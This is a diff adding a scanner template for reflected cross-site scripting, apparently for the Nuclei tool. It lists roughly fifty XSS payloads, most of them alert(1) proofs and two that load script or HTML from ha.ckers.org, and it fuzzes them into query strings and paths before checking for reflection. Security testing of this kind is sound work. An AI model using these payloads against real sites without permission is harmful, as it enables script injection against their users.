@@ -1,0 +1,95 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<html id=x tabindex=1 onactivate=alert(1)></html><input autofocus>"
+        - "<style>:target {color:red;}</style><mark id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></mark>"
+        - "<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>"
+        - "<details draggable=\"true\" ondragend=\"alert(1)\">test</details>"
+        - "<canvas draggable=\"true\" ondragleave=\"alert(1)\">test</canvas>"
+        - "<dl onclick=\"alert(1)\">test</dl>"
+        - "<track onmousemove=\"alert(1)\">test</track>"
+        - "<menuitem id=x tabindex=1 onbeforedeactivate=alert(1)></menuitem><input autofocus>"
+        - "<SCRIPT>alert('XSS')</SCRIPT"
+        - "<basefont onmouseenter=\"alert(1)\">test</basefont>"
+        - "<details draggable=\"true\" ondragend=\"alert(1)\">test</details>"
+        - "<plaintext onmouseover=\"alert(1)\">test</plaintext>"
+        - "<xmp draggable=\"true\" ondragstart=\"alert(1)\">test</xmp>"
+        - "<style>@keyframes slidein {}</style><dialog style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></dialog>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>"
+        - "<tt onmousemove=\"alert(1)\">test</tt>"
+        - "<output id=x tabindex=1 onfocusin=alert(1)></output>"
+        - "<time id=x tabindex=1 onfocusin=alert(1)></time>"
+        - "<svg/onload=alert(1)"
+        - "<div draggable=\"true\" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>"
+        - "<picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>"
+        - "<iframe onbeforepaste=\"alert(1)\" contenteditable>test</iframe>"
+        - "<output onbeforepaste=\"alert(1)\" contenteditable>test</output>"
+        - "<svg><img onload=alert(1)></svg>"
+        - "<IMG SRC=x oncopy=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<frameset draggable=\"true\" ondragend=\"alert(1)\">test</frameset>"
+        - "<script>alert('XSS');</script>"
+        - "<svg><script>alert(1)</script></svg>"
+        - "&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;"
+        - "<video autoplay controls onseeking timeupdate><source src=validvideo.mp4 type=video/mp4></video>"
+        - "</div>"
+        - "<colgroup onbeforepaste=\"alert(1)\" contenteditable>test</colgroup>"
+        - "<output id=x tabindex=1 onfocusin=alert(1)></output><input autofocus>"
+        - "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input autofocus>"
+        - "<multicol onkeypress=\"alert(1)\" contenteditable>test</multicol>"
+        - "<video onmouseenter=\"alert(1)\">test</video>"
+        - "<IMG SRC=\"jav&#x0B1;ascript:alert(1);\">"
+        - "<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input autofocus>"
+        - "<svg><a href=\"jav&#x0D;ascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a></svg"
+        - "<SCRIPT>alert(1)</SCRIPT>"
+        - "<sub id=x tabindex=1 onfocusin=alert(1)></sub>"
+        - "<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>"
+        - "<style>@keyframes slidein {}</style><svg style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></svg>"
+        - "<form><input type=image src=onerror\\x0D=javascript:alert(1)>"
+        - "<style>@keyframes x{}</style><thead style=\"animation-name:x\" onanimationend=\"alert(1)\"></thead>"
+        - "<embed onclick=\"alert(1)\">test</embed>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable>drop here</bdi>"
+        - "<script>alert(\"XSS by javascript\");</script>"
+        - "<embed src=\"http://ha.ckers.org/xss.html\">"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
